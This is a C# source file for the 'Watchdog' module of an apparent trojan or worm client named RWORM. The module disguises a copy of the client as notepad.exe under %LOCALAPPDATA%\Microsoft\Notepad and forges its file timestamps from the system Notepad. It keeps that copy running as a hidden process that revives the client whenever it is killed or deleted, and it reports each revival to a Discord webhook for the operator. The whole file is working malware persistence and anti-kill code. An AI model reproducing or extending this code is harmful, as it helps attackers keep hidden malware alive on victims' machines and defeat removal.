using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    public static class Watchdog
    {
        private static Process? _watchdogProcess;
        private static volatile bool _isShuttingDown = false;
        private static readonly string FlagPath = Path.Combine(Path.GetTempPath(), "sess_exit.flag");

        public static void InitializeWatchdog()
        {
            if (!Config.AntiKill) return;

            try
            {
                var currentExe = Environment.ProcessPath;
                if (string.IsNullOrEmpty(currentExe) || !File.Exists(currentExe))
                {
                    currentExe = Process.GetCurrentProcess().MainModule?.FileName;
                }
                if (string.IsNullOrEmpty(currentExe) || !File.Exists(currentExe)) return;

                // Ensure clean exit flag is removed from any previous session
                try { if (File.Exists(FlagPath)) File.Delete(FlagPath); } catch { }

                // Determine backup exe location: %LOCALAPPDATA%\Microsoft\Notepad\notepad.exe
                string backupDir;
                try
                {
                    backupDir = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                        "Microsoft", "Notepad");
                    Directory.CreateDirectory(backupDir);
                }
                catch
                {
                    backupDir = Path.Combine(Path.GetTempPath(), "Notepad");
                    Directory.CreateDirectory(backupDir);
                }

                var backupExe = Path.Combine(backupDir, "notepad.exe");

                // Clean up any legacy watchdog names if present
                try
                {
                    var legacyExe = Path.Combine(backupDir, "rworm_watchdog.exe");
                    if (File.Exists(legacyExe)) File.Delete(legacyExe);
                }
                catch { }

                // Copy current client binary as stealth notepad.exe
                try
                {
                    File.Copy(currentExe, backupExe, true);

                    // Clone file timestamps from system notepad.exe to blend in
                    var sysNotepad = Path.Combine(Environment.SystemDirectory, "notepad.exe");
                    if (File.Exists(sysNotepad))
                    {
                        File.SetCreationTime(backupExe, File.GetCreationTime(sysNotepad));
                        File.SetLastWriteTime(backupExe, File.GetLastWriteTime(sysNotepad));
                        File.SetLastAccessTime(backupExe, File.GetLastAccessTime(sysNotepad));
                    }
                }
                catch { }

                StartWatchdogInstance(currentExe, backupExe);
            }
            catch { }
        }

        private static void StartWatchdogInstance(string currentExe, string backupExe)
        {
            if (_isShuttingDown) return;

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = backupExe,
                    Arguments              = $"--watchdog \"{currentExe}\" {Environment.ProcessId}",
                    UseShellExecute        = false,
                    CreateNoWindow         = true,
                    WindowStyle            = ProcessWindowStyle.Hidden
                };

                _watchdogProcess = Process.Start(psi);
                if (_watchdogProcess != null)
                {
                    _watchdogProcess.EnableRaisingEvents = true;
                    _watchdogProcess.Exited += (s, e) =>
                    {
                        if (!_isShuttingDown)
                        {
                            Thread.Sleep(1000);
                            StartWatchdogInstance(currentExe, backupExe);
                        }
                    };
                }
            }
            catch { }
        }

        public static void PrepareCleanExit()
        {
            _isShuttingDown = true;
            try
            {
                File.WriteAllText(FlagPath, "clean_exit");
            }
            catch { }

            try
            {
                if (_watchdogProcess != null && !_watchdogProcess.HasExited)
                {
                    _watchdogProcess.Kill();
                }
            }
            catch { }
        }

        /// <summary>
        /// Entry point for backup executable running in --watchdog mode.
        /// Continually monitors target PID; if killed unexpectedly, revives target executable.
        /// </summary>
        public static void RunWatchdogMode(string[] args)
        {
            if (args.Length < 3) return;

            string targetExe = args[1];
            if (!int.TryParse(args[2], out int targetPid)) return;

            MonitorLoop(targetExe, targetPid);
        }

        private static void MonitorLoop(string targetExe, int targetPid)
        {
            while (true)
            {
                try
                {
                    var parentProc = Process.GetProcessById(targetPid);
                    parentProc.WaitForExit();
                }
                catch
                {
                    // Target process is no longer running
                }

                // Check if clean shutdown was signaled by operator / C2
                if (File.Exists(FlagPath))
                {
                    try { File.Delete(FlagPath); } catch { }
                    return; // Clean exit, do not resurrect
                }

                // Process was abruptly killed! Revive target exe
                try
                {
                    // If target executable was deleted or moved, restore from current watchdog binary
                    if (!File.Exists(targetExe))
                    {
                        var selfExe = Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule?.FileName;
                        if (!string.IsNullOrEmpty(selfExe) && File.Exists(selfExe))
                        {
                            var targetDir = Path.GetDirectoryName(targetExe);
                            if (!string.IsNullOrEmpty(targetDir)) Directory.CreateDirectory(targetDir);
                            File.Copy(selfExe, targetExe, true);
                        }
                    }

                    // Alert on Discord if configured
                    if (Config.DiscordAlert && !string.IsNullOrWhiteSpace(Config.DiscordWebhook))
                    {
                        _ = DiscordNotifier.SendReviveAlertAsync(Config.DiscordWebhook, targetExe);
                    }

                    // Spawn resurrected client
                    var psi = new ProcessStartInfo
                    {
                        FileName        = targetExe,
                        UseShellExecute = true,
                        CreateNoWindow  = true,
                        WindowStyle     = ProcessWindowStyle.Hidden
                    };

                    var newProc = Process.Start(psi);
                    if (newProc != null)
                    {
                        targetPid = newProc.Id;
                        Thread.Sleep(2000);
                        continue; // Keep monitoring the new process instance
                    }
                }
                catch { }

                Thread.Sleep(3000);
            }
        }
    }
}
